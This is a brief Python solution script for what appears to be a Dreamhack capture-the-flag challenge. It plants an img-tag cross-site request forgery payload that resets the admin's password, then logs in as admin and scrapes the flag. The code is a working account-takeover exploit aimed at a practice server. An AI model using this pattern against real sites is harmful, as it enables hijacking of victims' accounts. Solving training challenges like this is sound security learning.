from bs4 import BeautifulSoup
import requests

URL = "http://host3.dreamhack.games:18638"
FLAG_URI = "/flag"
LOGIN_URI = "/login"
PAYLOAD = '<img src="/change_password?pw=1">'
FLAG_DATA = {'param':PAYLOAD}
LOGIN_DATA = {'username':'admin', 'password':'1'}

# 1. CHANGE ADMIN PASSWORD
requests.post(URL + FLAG_URI, data=FLAG_DATA)

# 2. PRINT RLAG
resp = requests.post(URL + LOGIN_URI, data=LOGIN_DATA)

soup = BeautifulSoup(resp.content,"html.parser")
pre = soup.find('h1')
flag = pre.contents[0]
print(flag)